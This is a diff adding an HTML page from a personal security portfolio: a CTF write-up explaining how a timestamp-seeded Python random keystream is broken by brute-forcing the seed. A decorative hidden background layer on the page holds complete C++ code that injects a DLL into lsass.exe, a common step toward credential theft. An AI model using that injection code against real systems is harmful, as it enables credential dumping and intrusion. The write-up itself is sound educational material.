@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seeds of Time</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Seeds of Time" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Seeds of Time</h1>
+            
+            <p class="post-meta">Published: April 29, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">HQX{c126bb454bbe38c397a5daf0729fbd08}</code></p>
+
+<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+
+<ol>
+  <li>We are given a Python encryption script and a ciphertext.</li>
+  <li>The script encrypts a secret <code class="language-plaintext highlighter-rouge">FLAG</code> using a keystream generated from Python’s random module, seeded with the current Unix timestamp.</li>
+  <li>The goal is to recover the original <code class="language-plaintext highlighter-rouge">FLAG</code>.</li>
+  <li>Given Encryption Code:</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+<span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+<span class="n">FLAG</span> <span class="o">=</span> <span class="sh">"</span><span class="s">REDACTED</span><span class="sh">"</span>
+<span class="n">keystream</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span>
+    <span class="nf">int</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">FLAG</span><span class="p">))</span>
+<span class="p">)</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">f</span> <span class="o">^</span> <span class="n">k</span> <span class="k">for</span> <span class="n">f</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">FLAG</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="n">keystream</span><span class="p">)])</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="nf">hex</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>And ciphertext:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f60d1ef6307bc56ed4f3f8fe41eacd9883b571ae87dc9dd018b0083b601303b923ebba81ca
+</code></pre></div></div>
+
+<ol>
+  <li>The encryption process works as follows:
+    <ul>
+      <li>The random number generator is seeded using <code class="language-plaintext highlighter-rouge">int(time.time())</code></li>
+      <li>A keystream of the same length as the flag is generated</li>
+      <li>Each byte of the flag is XORed with the keystream</li>
+      <li>The result is output as hex</li>
+    </ul>
+
+    <p>Mathematically:
+<code class="language-plaintext highlighter-rouge">cipher = FLAG ⊕ keystream</code></p>
+
+    <p>Since XOR is reversible:
+<code class="language-plaintext highlighter-rouge">FLAG = cipher ⊕ keystream</code></p>
+  </li>
+  <li>The critical weaknesses are:
+    <ul>
+      <li><strong>Predictable Seed:</strong>
+<code class="language-plaintext highlighter-rouge">seed = int(time.time())</code>
+Unix timestamps change once per second. The seed space is very small (≈ 86,400 per day).</li>
+      <li><strong>Non-Cryptographic PRNG:</strong>
+<code class="language-plaintext highlighter-rouge">random.random()</code>
+Unlike other PRNGs, Python’s <code class="language-plaintext highlighter-rouge">random</code> module is deterministic. Same seed → same keystream.</li>
+    </ul>
+  </li>
+  <li>Instead of brute-forcing the flag, I brute-forced the seed.</li>
+  <li>Ciphertext length tells us the flag length.</li>
+  <li>Seed is likely close to the current time.</li>
+  <li>Reproducing the keystream allows full decryption.</li>
+  <li>Attack Plan:
+    <ul>
+      <li>Convert ciphertext from hex to bytes.</li>
+      <li>Loop over plausible timestamp values.</li>
+      <li>Regenerate the keystream for each seed.</li>
+      <li>XOR keystream with ciphertext.</li>
+      <li>Check if output looks like a valid flag.</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="script-and-output">Script and Output:</h3>
+
+<p><img src="/assets/images/writeups/tcs-hackquest/04-seeds-of-time.png" alt="Seeds of Time Script Output" /></p>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
